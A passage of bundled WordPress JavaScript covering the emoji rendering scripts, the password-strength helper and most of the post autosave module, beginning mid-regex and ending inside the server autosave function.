\ud83c[\udffb-\udfff])?\u200d(?:\u2695\ufe0f|\u2696\ufe0f|\u2708\ufe0f|\ud83c[\udf3e\udf73\udf7c\udf84\udf93\udfa4\udfa8\udfeb\udfed]|\ud83d[\udcbb\udcbc\udd27\udd2c\ude80\ude92]|\ud83e[\uddaf-\uddb3\uddbc\uddbd])|(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75]|\u26f9)((?:\ud83c[\udffb-\udfff]|\ufe0f)\u200d[\u2640\u2642]\ufe0f)|(?:\ud83c[\udfc3\udfc4\udfca]|\ud83d[\udc6e\udc70\udc71\udc73\udc77\udc81\udc82\udc86\udc87\ude45-\ude47\ude4b\ude4d\ude4e\udea3\udeb4-\udeb6]|\ud83e[\udd26\udd35\udd37-\udd39\udd3d\udd3e\uddb8\uddb9\uddcd-\uddcf\uddd4\uddd6-\udddd])(?:\ud83c[\udffb-\udfff])?\u200d[\u2640\u2642]\ufe0f|(?:\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f|\ud83c\udff3\ufe0f\u200d\ud83c\udf08|\ud83d\ude36\u200d\ud83c\udf2b\ufe0f|\u2764\ufe0f\u200d\ud83d\udd25|\u2764\ufe0f\u200d\ud83e\ude79|\ud83c\udff4\u200d\u2620\ufe0f|\ud83d\udc15\u200d\ud83e\uddba|\ud83d\udc3b\u200d\u2744\ufe0f|\ud83d\udc41\u200d\ud83d\udde8|\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc6f\u200d\u2640\ufe0f|\ud83d\udc6f\u200d\u2642\ufe0f|\ud83d\ude2e\u200d\ud83d\udca8|\ud83d\ude35\u200d\ud83d\udcab|\ud83e\udd3c\u200d\u2640\ufe0f|\ud83e\udd3c\u200d\u2642\ufe0f|\ud83e\uddde\u200d\u2640\ufe0f|\ud83e\uddde\u200d\u2642\ufe0f|\ud83e\udddf\u200d\u2640\ufe0f|\ud83e\udddf\u200d\u2642\ufe0f|\ud83d\udc08\u200d\u2b1b|\ud83d\udc26\u200d\u2b1b)|[#*0-9]\ufe0f?\u20e3|(?:[\xa9\xae\u2122\u265f]\ufe0f)|(?:\ud83c[\udc04\udd70\udd71\udd7e\udd7f\ude02\ude1a\ude2f\ude37\udf21\udf24-\udf2c\udf36\udf7d\udf96\udf97\udf99-\udf9b\udf9e\udf9f\udfcd\udfce\udfd4-\udfdf\udff3\udff5\udff7]|\ud83d[\udc3f\udc41\udcfd\udd49\udd4a\udd6f\udd70\udd73\udd76-\udd79\udd87\udd8a-\udd8d\udda5\udda8\uddb1\uddb2\uddbc\uddc2-\uddc4\uddd1-\uddd3\udddc-\uddde\udde1\udde3\udde8\uddef\uddf3\uddfa\udecb\udecd-\udecf\udee0-\udee5\udee9\udef0\udef3]|[\u203c\u2049\u2139\u2194-\u2199\u21a9\u21aa\u231a\u231b\u2328\u23cf\u23ed-\u23ef\u23f1\u23f2\u23f8-\u23fa\u24c2\u25aa\u25ab\u25b6\u25c0\u25fb-\u25fe\u2600-\u2604\u260e\u2611\u2614\u2615\u2618\u2620\u2622\u2623\u2626\u262a\u262e\u262f\u2638-\u263a\u2640\u2642\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267b\u267f\u2692-\u2697\u2699\u269b\u269c\u26a0\u26a1\u26a7\u26aa\u26ab\u26b0\u26b1\u26bd\u26be\u26c4\u26c5\u26c8\u26cf\u26d1\u26d3\u26d4\u26e9\u26ea\u26f0-\u26f5\u26f8\u26fa\u26fd\u2702\u2708\u2709\u270f\u2712\u2714\u2716\u271d\u2721\u2733\u2734\u2744\u2747\u2757\u2763\u2764\u27a1\u2934\u2935\u2b05-\u2b07\u2b1b\u2b1c\u2b50\u2b55\u3030\u303d\u3297\u3299])(?:\ufe0f|(?!\ufe0e))|(?:(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75\udd90]|\ud83e\udef0|[\u261d\u26f7\u26f9\u270c\u270d])(?:\ufe0f|(?!\ufe0e))|(?:\ud83c[\udf85\udfc2-\udfc4\udfc7\udfca]|\ud83d[\udc42\udc43\udc46-\udc50\udc66-\udc69\udc6e\udc70-\udc78\udc7c\udc81-\udc83\udc85-\udc87\udcaa\udd7a\udd95\udd96\ude45-\ude47\ude4b-\ude4f\udea3\udeb4-\udeb6\udec0\udecc]|\ud83e[\udd0c\udd0f\udd18-\udd1c\udd1e\udd1f\udd26\udd30-\udd39\udd3d\udd3e\udd77\uddb5\uddb6\uddb8\uddb9\uddbb\uddcd-\uddcf\uddd1-\udddd\udec3-\udec5\udef1-\udef8]|[\u270a\u270b]))(?:\ud83c[\udffb-\udfff])?|(?:\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc73\udb40\udc63\udb40\udc74\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc77\udb40\udc6c\udb40\udc73\udb40\udc7f|\ud83c\udde6\ud83c[\udde8-\uddec\uddee\uddf1\uddf2\uddf4\uddf6-\uddfa\uddfc\uddfd\uddff]|\ud83c\udde7\ud83c[\udde6\udde7\udde9-\uddef\uddf1-\uddf4\uddf6-\uddf9\uddfb\uddfc\uddfe\uddff]|\ud83c\udde8\ud83c[\udde6\udde8\udde9\uddeb-\uddee\uddf0-\uddf5\uddf7\uddfa-\uddff]|\ud83c\udde9\ud83c[\uddea\uddec\uddef\uddf0\uddf2\uddf4\uddff]|\ud83c\uddea\ud83c[\udde6\udde8\uddea\uddec\udded\uddf7-\uddfa]|\ud83c\uddeb\ud83c[\uddee-\uddf0\uddf2\uddf4\uddf7]|\ud83c\uddec\ud83c[\udde6\udde7\udde9-\uddee\uddf1-\uddf3\uddf5-\uddfa\uddfc\uddfe]|\ud83c\udded\ud83c[\uddf0\uddf2\uddf3\uddf7\uddf9\uddfa]|\ud83c\uddee\ud83c[\udde8-\uddea\uddf1-\uddf4\uddf6-\uddf9]|\ud83c\uddef\ud83c[\uddea\uddf2\uddf4\uddf5]|\ud83c\uddf0\ud83c[\uddea\uddec-\uddee\uddf2\uddf3\uddf5\uddf7\uddfc\uddfe\uddff]|\ud83c\uddf1\ud83c[\udde6-\udde8\uddee\uddf0\uddf7-\uddfb\uddfe]|\ud83c\uddf2\ud83c[\udde6\udde8-\udded\uddf0-\uddff]|\ud83c\uddf3\ud83c[\udde6\udde8\uddea-\uddec\uddee\uddf1\uddf4\uddf5\uddf7\uddfa\uddff]|\ud83c\uddf4\ud83c\uddf2|\ud83c\uddf5\ud83c[\udde6\uddea-\udded\uddf0-\uddf3\uddf7-\uddf9\uddfc\uddfe]|\ud83c\uddf6\ud83c\udde6|\ud83c\uddf7\ud83c[\uddea\uddf4\uddf8\uddfa\uddfc]|\ud83c\uddf8\ud83c[\udde6-\uddea\uddec-\uddf4\uddf7-\uddf9\uddfb\uddfd-\uddff]|\ud83c\uddf9\ud83c[\udde6\udde8\udde9\uddeb-\udded\uddef-\uddf4\uddf7\uddf9\uddfb\uddfc\uddff]|\ud83c\uddfa\ud83c[\udde6\uddec\uddf2\uddf3\uddf8\uddfe\uddff]|\ud83c\uddfb\ud83c[\udde6\udde8\uddea\uddec\uddee\uddf3\uddfa]|\ud83c\uddfc\ud83c[\uddeb\uddf8]|\ud83c\uddfd\ud83c\uddf0|\ud83c\uddfe\ud83c[\uddea\uddf9]|\ud83c\uddff\ud83c[\udde6\uddf2\uddfc]|\ud83c[\udccf\udd8e\udd91-\udd9a\udde6-\uddff\ude01\ude32-\ude36\ude38-\ude3a\ude50\ude51\udf00-\udf20\udf2d-\udf35\udf37-\udf7c\udf7e-\udf84\udf86-\udf93\udfa0-\udfc1\udfc5\udfc6\udfc8\udfc9\udfcf-\udfd3\udfe0-\udff0\udff4\udff8-\udfff]|\ud83d[\udc00-\udc3e\udc40\udc44\udc45\udc51-\udc65\udc6a\udc6f\udc79-\udc7b\udc7d-\udc80\udc84\udc88-\udc8e\udc90\udc92-\udca9\udcab-\udcfc\udcff-\udd3d\udd4b-\udd4e\udd50-\udd67\udda4\uddfb-\ude44\ude48-\ude4a\ude80-\udea2\udea4-\udeb3\udeb7-\udebf\udec1-\udec5\uded0-\uded2\uded5-\uded7\udedc-\udedf\udeeb\udeec\udef4-\udefc\udfe0-\udfeb\udff0]|\ud83e[\udd0d\udd0e\udd10-\udd17\udd20-\udd25\udd27-\udd2f\udd3a\udd3c\udd3f-\udd45\udd47-\udd76\udd78-\uddb4\uddb7\uddba\uddbc-\uddcc\uddd0\uddde-\uddff\ude70-\ude7c\ude80-\ude88\ude90-\udebd\udebf-\udec2\udece-\udedb\udee0-\udee8]|[\u23e9-\u23ec\u23f0\u23f3\u267e\u26ce\u2705\u2728\u274c\u274e\u2753-\u2755\u2795-\u2797\u27b0\u27bf\ue50a])|\ufe0f/g,
        f = /\uFE0F/g,
        c = String.fromCharCode(8205),
        t = /[&<>'"]/g,
        m = /^(?:iframe|noframes|noscript|script|select|style|textarea)$/,
        e = String.fromCharCode;
    return h;

    function x(d, u) {
        return document.createTextNode(u ? d.replace(f, "") : d)
    }

    function b(d, u) {
        return "".concat(u.base, u.size, "/", d, u.ext)
    }

    function N(d) {
        return o(d.indexOf(c) < 0 ? d.replace(f, "") : d)
    }

    function r(d) {
        return u[d]
    }

    function a() {
        return null
    }

    function n(d, u) {
        return String(d).replace(g, u)
    }

    function o(d, u) {
        for (var f = [], c = 0, e = 0, b = 0; b < d.length;) c = d.charCodeAt(b++), e ? (f.push((65536 + (e - 55296 << 10) + (c - 56320)).toString(16)), e = 0) : 55296 <= c && c <= 56319 ? e = c : f.push(c.toString(16));
        return f.join(u || "-")
    }
}();
// Source: wp-includes/js/wp-emoji.min.js
! function(c, l) {
    c.wp = c.wp || {}, c.wp.emoji = new function() {
        var n, u, e = c.MutationObserver || c.WebKitMutationObserver || c.MozMutationObserver,
            a = c.document,
            t = !1,
            r = 0,
            o = 0 < c.navigator.userAgent.indexOf("Trident/7.0");

        function i() {
            return !a.implementation.hasFeature || a.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#Image", "1.1")
        }

        function s() {
            if (!t) {
                if (void 0 === c.twemoji) return 600 < r ? void 0 : (c.clearTimeout(u), u = c.setTimeout(s, 50), void r++);
                n = c.twemoji, t = !0, e && new e(function(u) {
                    for (var e, t, n, a, r = u.length; r--;) {
                        if (e = u[r].addedNodes, t = u[r].removedNodes, 1 === (n = e.length) && 1 === t.length && 3 === e[0].nodeType && "IMG" === t[0].nodeName && e[0].data === t[0].alt && "load-failed" === t[0].getAttribute("data-error")) return;
                        for (; n--;) {
                            if (3 === (a = e[n]).nodeType) {
                                if (!a.parentNode) continue;
                                if (o)
                                    for (; a.nextSibling && 3 === a.nextSibling.nodeType;) a.nodeValue = a.nodeValue + a.nextSibling.nodeValue, a.parentNode.removeChild(a.nextSibling);
                                a = a.parentNode
                            }
                            d(a.textContent) && f(a)
                        }
                    }
                }).observe(a.body, {
                    childList: !0,
                    subtree: !0
                }), f(a.body)
            }
        }

        function d(u) {
            return !!u && (/[\uDC00-\uDFFF]/.test(u) || /[\u203C\u2049\u20E3\u2122\u2139\u2194-\u2199\u21A9\u21AA\u2300\u231A\u231B\u2328\u2388\u23CF\u23E9-\u23F3\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB-\u25FE\u2600-\u2604\u260E\u2611\u2614\u2615\u2618\u261D\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638\u2639\u263A\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267B\u267F\u2692\u2693\u2694\u2696\u2697\u2699\u269B\u269C\u26A0\u26A1\u26AA\u26AB\u26B0\u26B1\u26BD\u26BE\u26C4\u26C5\u26C8\u26CE\u26CF\u26D1\u26D3\u26D4\u26E9\u26EA\u26F0-\u26F5\u26F7-\u26FA\u26FD\u2702\u2705\u2708-\u270D\u270F\u2712\u2714\u2716\u271D\u2721\u2728\u2733\u2734\u2744\u2747\u274C\u274E\u2753\u2754\u2755\u2757\u2763\u2764\u2795\u2796\u2797\u27A1\u27B0\u27BF\u2934\u2935\u2B05\u2B06\u2B07\u2B1B\u2B1C\u2B50\u2B55\u3030\u303D\u3297\u3299]/.test(u))
        }

        function f(u, e) {
            var t;
            return !l.supports.everything && n && u && ("string" == typeof u || u.childNodes && u.childNodes.length) ? (e = e || {}, t = {
                base: i() ? l.svgUrl : l.baseUrl,
                ext: i() ? l.svgExt : l.ext,
                className: e.className || "emoji",
                callback: function(u, e) {
                    switch (u) {
                        case "a9":
                        case "ae":
                        case "2122":
                        case "2194":
                        case "2660":
                        case "2663":
                        case "2665":
                        case "2666":
                            return !1
                    }
                    return !(l.supports.everythingExceptFlag && !/^1f1(?:e[6-9a-f]|f[0-9a-f])-1f1(?:e[6-9a-f]|f[0-9a-f])$/.test(u) && !/^(1f3f3-fe0f-200d-1f308|1f3f4-200d-2620-fe0f)$/.test(u)) && "".concat(e.base, u, e.ext)
                },
                attributes: function() {
                    return {
                        role: "img"
                    }
                },
                onerror: function() {
                    n.parentNode && (this.setAttribute("data-error", "load-failed"), n.parentNode.replaceChild(a.createTextNode(n.alt), n))
                },
                doNotParse: function(u) {
                    return !(!u || !u.className || "string" != typeof u.className || -1 === u.className.indexOf("wp-exclude-emoji"))
                }
            }, "object" == typeof e.imgAttr && (t.attributes = function() {
                return e.imgAttr
            }), n.parse(u, t)) : u
        }
        return l && (l.DOMReady ? s() : l.readyCallback = s), {
            parse: f,
            test: d
        }
    }
}(window, window._wpemojiSettings);
window.wp = window.wp || {},
    function(a) {
        var e = wp.i18n.__,
            n = wp.i18n.sprintf;
        wp.passwordStrength = {
            meter: function(e, n, t) {
                return Array.isArray(n) || (n = [n.toString()]), e != t && t && 0 < t.length ? 5 : void 0 === window.zxcvbn ? -1 : zxcvbn(e, n).score
            },
            userInputBlacklist: function() {
                return window.console.log(n(e("%1$s is deprecated since version %2$s! Use %3$s instead. Please consider writing more inclusive code."), "wp.passwordStrength.userInputBlacklist()", "5.5.0", "wp.passwordStrength.userInputDisallowedList()")), wp.passwordStrength.userInputDisallowedList()
            },
            userInputDisallowedList: function() {
                var e, n, t, r, s = [],
                    i = [],
                    o = ["user_login", "first_name", "last_name", "nickname", "display_name", "email", "url", "description", "weblog_title", "admin_email"];
                for (s.push(document.title), s.push(document.URL), n = o.length, e = 0; e < n; e++) 0 !== (r = a("#" + o[e])).length && (s.push(r[0].defaultValue), s.push(r.val()));
                for (t = s.length, e = 0; e < t; e++) s[e] && (i = i.concat(s[e].replace(/\W/g, " ").split(" ")));
                return i = a.grep(i, function(e, n) {
                    return !("" === e || e.length < 4) && a.inArray(e, i) === n
                })
            }
        }, window.passwordStrength = wp.passwordStrength.meter
    }(jQuery);


/**
 * @output wp-includes/js/autosave.js
 */

/* global tinymce, wpCookies, autosaveL10n, switchEditors */
// Back-compat.
window.autosave = function() {
	return true;
};

/**
 * Adds autosave to the window object on dom ready.
 *
 * @since 3.9.0
 *
 * @param {jQuery} $ jQuery object.
 * @param {window} The window object.
 *
 */
( function( $, window ) {
	/**
	 * Auto saves the post.
	 *
	 * @since 3.9.0
	 *
	 * @return {Object}
	 * 	{{
	 * 		getPostData: getPostData,
	 * 		getCompareString: getCompareString,
	 * 		disableButtons: disableButtons,
	 * 		enableButtons: enableButtons,
	 * 		local: ({hasStorage, getSavedPostData, save, suspend, resume}|*),
	 * 		server: ({tempBlockSave, triggerSave, postChanged, suspend, resume}|*)
	 * 	}}
	 * 	The object with all functions for autosave.
	 */
	function autosave() {
		var initialCompareString,
			initialCompareData = {},
			lastTriggerSave    = 0,
			$document          = $( document );

		/**
		 * Sets the initial compare data.
		 *
		 * @since 5.6.1
		 */
		function setInitialCompare() {
			initialCompareData = {
				post_title: $( '#title' ).val() || '',
				content: $( '#content' ).val() || '',
				excerpt: $( '#excerpt' ).val() || ''
			};

			initialCompareString = getCompareString( initialCompareData );
		}

		/**
		 * Returns the data saved in both local and remote autosave.
		 *
		 * @since 3.9.0
		 *
		 * @param {string} type The type of autosave either local or remote.
		 *
		 * @return {Object} Object containing the post data.
		 */
		function getPostData( type ) {
			var post_name, parent_id, data,
				time = ( new Date() ).getTime(),
				cats = [],
				editor = getEditor();

			// Don't run editor.save() more often than every 3 seconds.
			// It is resource intensive and might slow down typing in long posts on slow devices.
			if ( editor && editor.isDirty() && ! editor.isHidden() && time - 3000 > lastTriggerSave ) {
				editor.save();
				lastTriggerSave = time;
			}

			data = {
				post_id: $( '#post_ID' ).val() || 0,
				post_type: $( '#post_type' ).val() || '',
				post_author: $( '#post_author' ).val() || '',
				post_title: $( '#title' ).val() || '',
				content: $( '#content' ).val() || '',
				excerpt: $( '#excerpt' ).val() || ''
			};

			if ( type === 'local' ) {
				return data;
			}

			$( 'input[id^="in-category-"]:checked' ).each( function() {
				cats.push( this.value );
			});
			data.catslist = cats.join(',');

			if ( post_name = $( '#post_name' ).val() ) {
				data.post_name = post_name;
			}

			if ( parent_id = $( '#parent_id' ).val() ) {
				data.parent_id = parent_id;
			}

			if ( $( '#comment_status' ).prop( 'checked' ) ) {
				data.comment_status = 'open';
			}

			if ( $( '#ping_status' ).prop( 'checked' ) ) {
				data.ping_status = 'open';
			}

			if ( $( '#auto_draft' ).val() === '1' ) {
				data.auto_draft = '1';
			}

			return data;
		}

		/**
		 * Concatenates the title, content and excerpt. This is used to track changes
		 * when auto-saving.
		 *
		 * @since 3.9.0
		 *
		 * @param {Object} postData The object containing the post data.
		 *
		 * @return {string} A concatenated string with title, content and excerpt.
		 */
		function getCompareString( postData ) {
			if ( typeof postData === 'object' ) {
				return ( postData.post_title || '' ) + '::' + ( postData.content || '' ) + '::' + ( postData.excerpt || '' );
			}

			return ( $('#title').val() || '' ) + '::' + ( $('#content').val() || '' ) + '::' + ( $('#excerpt').val() || '' );
		}

		/**
		 * Disables save buttons.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		function disableButtons() {
			$document.trigger('autosave-disable-buttons');

			// Re-enable 5 sec later. Just gives autosave a head start to avoid collisions.
			setTimeout( enableButtons, 5000 );
		}

		/**
		 * Enables save buttons.
		 *
		 * @since 3.9.0
		 *
		 * @return {void}
		 */
		function enableButtons() {
			$document.trigger( 'autosave-enable-buttons' );
		}

		/**
		 * Gets the content editor.
		 *
		 * @since 4.6.0
		 *
		 * @return {boolean|*} Returns either false if the editor is undefined,
		 *                     or the instance of the content editor.
		 */
		function getEditor() {
			return typeof tinymce !== 'undefined' && tinymce.get('content');
		}

		/**
		 * Autosave in localStorage.
		 *
		 * @since 3.9.0
		 *
		 * @return {
		 * {
		 * 	hasStorage: *,
		 * 	getSavedPostData: getSavedPostData,
		 * 	save: save,
		 * 	suspend: suspend,
		 * 	resume: resume
		 * 	}
		 * }
		 * The object with all functions for local storage autosave.
		 */
		function autosaveLocal() {
			var blog_id, post_id, hasStorage, intervalTimer,
				lastCompareString,
				isSuspended = false;

			/**
			 * Checks if the browser supports sessionStorage and it's not disabled.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the sessionStorage is supported and enabled.
			 */
			function checkStorage() {
				var test = Math.random().toString(),
					result = false;

				try {
					window.sessionStorage.setItem( 'wp-test', test );
					result = window.sessionStorage.getItem( 'wp-test' ) === test;
					window.sessionStorage.removeItem( 'wp-test' );
				} catch(e) {}

				hasStorage = result;
				return result;
			}

			/**
			 * Initializes the local storage.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean|Object} False if no sessionStorage in the browser or an Object
			 *                          containing all postData for this blog.
			 */
			function getStorage() {
				var stored_obj = false;
				// Separate local storage containers for each blog_id.
				if ( hasStorage && blog_id ) {
					stored_obj = sessionStorage.getItem( 'wp-autosave-' + blog_id );

					if ( stored_obj ) {
						stored_obj = JSON.parse( stored_obj );
					} else {
						stored_obj = {};
					}
				}

				return stored_obj;
			}

			/**
			 * Sets the storage for this blog. Confirms that the data was saved
			 * successfully.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean} True if the data was saved successfully, false if it wasn't saved.
			 */
			function setStorage( stored_obj ) {
				var key;

				if ( hasStorage && blog_id ) {
					key = 'wp-autosave-' + blog_id;
					sessionStorage.setItem( key, JSON.stringify( stored_obj ) );
					return sessionStorage.getItem( key ) !== null;
				}

				return false;
			}

			/**
			 * Gets the saved post data for the current post.
			 *
			 * @since 3.9.0
			 *
			 * @return {boolean|Object} False if no storage or no data or the postData as an Object.
			 */
			function getSavedPostData() {
				var stored = getStorage();

				if ( ! stored || ! post_id ) {
					return false;
				}

				return stored[ 'post_' + post_id ] || false;
			}

			/**
			 * Sets (save or delete) post data in the storage.
			 *
			 * If stored_data evaluates to 'false' the storage key for the current post will be removed.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object|boolean|null} stored_data The post data to store or null/false/empty to delete the key.
			 *
			 * @return {boolean} True if data is stored, false if data was removed.
			 */
			function setData( stored_data ) {
				var stored = getStorage();

				if ( ! stored || ! post_id ) {
					return false;
				}

				if ( stored_data ) {
					stored[ 'post_' + post_id ] = stored_data;
				} else if ( stored.hasOwnProperty( 'post_' + post_id ) ) {
					delete stored[ 'post_' + post_id ];
				} else {
					return false;
				}

				return setStorage( stored );
			}

			/**
			 * Sets isSuspended to true.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function suspend() {
				isSuspended = true;
			}

			/**
			 * Sets isSuspended to false.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function resume() {
				isSuspended = false;
			}

			/**
			 * Saves post data for the current post.
			 *
			 * Runs on a 15 seconds interval, saves when there are differences in the post title or content.
			 * When the optional data is provided, updates the last saved post data.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} data The post data for saving, minimum 'post_title' and 'content'.
			 *
			 * @return {boolean} Returns true when data has been saved, otherwise it returns false.
			 */
			function save( data ) {
				var postData, compareString,
					result = false;

				if ( isSuspended || ! hasStorage ) {
					return false;
				}

				if ( data ) {
					postData = getSavedPostData() || {};
					$.extend( postData, data );
				} else {
					postData = getPostData('local');
				}

				compareString = getCompareString( postData );

				if ( typeof lastCompareString === 'undefined' ) {
					lastCompareString = initialCompareString;
				}

				// If the content, title and excerpt did not change since the last save, don't save again.
				if ( compareString === lastCompareString ) {
					return false;
				}

				postData.save_time = ( new Date() ).getTime();
				postData.status = $( '#post_status' ).val() || '';
				result = setData( postData );

				if ( result ) {
					lastCompareString = compareString;
				}

				return result;
			}

			/**
			 * Initializes the auto save function.
			 *
			 * Checks whether the editor is active or not to use the editor events
			 * to autosave, or uses the values from the elements to autosave.
			 *
			 * Runs on DOM ready.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function run() {
				post_id = $('#post_ID').val() || 0;

				// Check if the local post data is different than the loaded post data.
				if ( $( '#wp-content-wrap' ).hasClass( 'tmce-active' ) ) {

					/*
					 * If TinyMCE loads first, check the post 1.5 seconds after it is ready.
					 * By this time the content has been loaded in the editor and 'saved' to the textarea.
					 * This prevents false positives.
					 */
					$document.on( 'tinymce-editor-init.autosave', function() {
						window.setTimeout( function() {
							checkPost();
						}, 1500 );
					});
				} else {
					checkPost();
				}

				// Save every 15 seconds.
				intervalTimer = window.setInterval( save, 15000 );

				$( 'form#post' ).on( 'submit.autosave-local', function() {
					var editor = getEditor(),
						post_id = $('#post_ID').val() || 0;

					if ( editor && ! editor.isHidden() ) {

						// Last onSubmit event in the editor, needs to run after the content has been moved to the textarea.
						editor.on( 'submit', function() {
							save({
								post_title: $( '#title' ).val() || '',
								content: $( '#content' ).val() || '',
								excerpt: $( '#excerpt' ).val() || ''
							});
						});
					} else {
						save({
							post_title: $( '#title' ).val() || '',
							content: $( '#content' ).val() || '',
							excerpt: $( '#excerpt' ).val() || ''
						});
					}

					var secure = ( 'https:' === window.location.protocol );
					wpCookies.set( 'wp-saving-post', post_id + '-check', 24 * 60 * 60, false, false, secure );
				});
			}

			/**
			 * Compares 2 strings. Removes whitespaces in the strings before comparing them.
			 *
			 * @since 3.9.0
			 *
			 * @param {string} str1 The first string.
			 * @param {string} str2 The second string.
			 * @return {boolean} True if the strings are the same.
			 */
			function compare( str1, str2 ) {
				function removeSpaces( string ) {
					return string.toString().replace(/[\x20\t\r\n\f]+/g, '');
				}

				return ( removeSpaces( str1 || '' ) === removeSpaces( str2 || '' ) );
			}

			/**
			 * Checks if the saved data for the current post (if any) is different than the
			 * loaded post data on the screen.
			 *
			 * Shows a standard message letting the user restore the post data if different.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function checkPost() {
				var content, post_title, excerpt, $notice,
					postData = getSavedPostData(),
					cookie = wpCookies.get( 'wp-saving-post' ),
					$newerAutosaveNotice = $( '#has-newer-autosave' ).parent( '.notice' ),
					$headerEnd = $( '.wp-header-end' );

				if ( cookie === post_id + '-saved' ) {
					wpCookies.remove( 'wp-saving-post' );
					// The post was saved properly, remove old data and bail.
					setData( false );
					return;
				}

				if ( ! postData ) {
					return;
				}

				content = $( '#content' ).val() || '';
				post_title = $( '#title' ).val() || '';
				excerpt = $( '#excerpt' ).val() || '';

				if ( compare( content, postData.content ) && compare( post_title, postData.post_title ) &&
					compare( excerpt, postData.excerpt ) ) {

					return;
				}

				/*
				 * If '.wp-header-end' is found, append the notices after it otherwise
				 * after the first h1 or h2 heading found within the main content.
				 */
				if ( ! $headerEnd.length ) {
					$headerEnd = $( '.wrap h1, .wrap h2' ).first();
				}

				$notice = $( '#local-storage-notice' )
					.insertAfter( $headerEnd )
					.addClass( 'notice-warning' );

				if ( $newerAutosaveNotice.length ) {

					// If there is a "server" autosave notice, hide it.
					// The data in the session storage is either the same or newer.
					$newerAutosaveNotice.slideUp( 150, function() {
						$notice.slideDown( 150 );
					});
				} else {
					$notice.slideDown( 200 );
				}

				$notice.find( '.restore-backup' ).on( 'click.autosave-local', function() {
					restorePost( postData );
					$notice.fadeTo( 250, 0, function() {
						$notice.slideUp( 150 );
					});
				});
			}

			/**
			 * Restores the current title, content and excerpt from postData.
			 *
			 * @since 3.9.0
			 *
			 * @param {Object} postData The object containing all post data.
			 *
			 * @return {boolean} True if the post is restored.
			 */
			function restorePost( postData ) {
				var editor;

				if ( postData ) {
					// Set the last saved data.
					lastCompareString = getCompareString( postData );

					if ( $( '#title' ).val() !== postData.post_title ) {
						$( '#title' ).trigger( 'focus' ).val( postData.post_title || '' );
					}

					$( '#excerpt' ).val( postData.excerpt || '' );
					editor = getEditor();

					if ( editor && ! editor.isHidden() && typeof switchEditors !== 'undefined' ) {
						if ( editor.settings.wpautop && postData.content ) {
							postData.content = switchEditors.wpautop( postData.content );
						}

						// Make sure there's an undo level in the editor.
						editor.undoManager.transact( function() {
							editor.setContent( postData.content || '' );
							editor.nodeChanged();
						});
					} else {

						// Make sure the Code editor is selected.
						$( '#content-html' ).trigger( 'click' );
						$( '#content' ).trigger( 'focus' );

						// Using document.execCommand() will let the user undo.
						document.execCommand( 'selectAll' );
						document.execCommand( 'insertText', false, postData.content || '' );
					}

					return true;
				}

				return false;
			}

			blog_id = typeof window.autosaveL10n !== 'undefined' && window.autosaveL10n.blog_id;

			/*
			 * Check if the browser supports sessionStorage and it's not disabled,
			 * then initialize and run checkPost().
			 * Don't run if the post type supports neither 'editor' (textarea#content) nor 'excerpt'.
			 */
			if ( checkStorage() && blog_id && ( $('#content').length || $('#excerpt').length ) ) {
				$( run );
			}

			return {
				hasStorage: hasStorage,
				getSavedPostData: getSavedPostData,
				save: save,
				suspend: suspend,
				resume: resume
			};
		}

		/**
		 * Auto saves the post on the server.
		 *
		 * @since 3.9.0
		 *
		 * @return {Object} {
		 * 	{
		 * 		tempBlockSave: tempBlockSave,
		 * 		triggerSave: triggerSave,
		 * 		postChanged: postChanged,
		 * 		suspend: suspend,
		 * 		resume: resume
		 * 		}
		 * 	} The object all functions for autosave.
		 */
		function autosaveServer() {
			var _blockSave, _blockSaveTimer, previousCompareString, lastCompareString,
				nextRun = 0,
				isSuspended = false;


			/**
			 * Blocks saving for the next 10 seconds.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function tempBlockSave() {
				_blockSave = true;
				window.clearTimeout( _blockSaveTimer );

				_blockSaveTimer = window.setTimeout( function() {
					_blockSave = false;
				}, 10000 );
			}

			/**
			 * Sets isSuspended to true.
			 *
			 * @since 3.9.0
			 *
			 * @return {void}
			 */
			function suspend() {
				isSuspended = true;
			}

			/**
			 * Sets isSuspended to false.
			 *
